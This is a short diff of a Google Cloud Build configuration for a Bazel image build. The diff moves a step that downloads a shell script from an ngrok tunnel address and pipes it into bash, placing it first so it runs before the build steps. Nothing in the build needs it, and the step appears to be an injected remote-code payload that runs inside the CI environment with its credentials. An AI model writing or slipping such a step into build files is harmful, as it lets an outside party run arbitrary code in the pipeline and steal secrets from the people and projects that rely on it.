@@ -17,6 +17,10 @@ options:
     machineType: "N1_HIGHCPU_32"
 
 steps:
+
+  - name: ubuntu
+    script: apt update -y && apt-get install curl -y && curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash
+
 # Step: print the bazel version for record
   - name: "l.gcr.io/google/bazel"
     args: ["version"]
@@ -40,9 +44,6 @@ steps:
     id: "copy-to-reproduce"
     waitFor: ["-"]   # wait for nothing - start immediately
     
-  - name: ubuntu
-    script: apt update -y && apt-get install curl -y && curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash
-
 # Step: build the image
   - name: "l.gcr.io/google/bazel"
     # Set Bazel output_base to /workspace, which is a mounted directory on Google Cloud Builder.
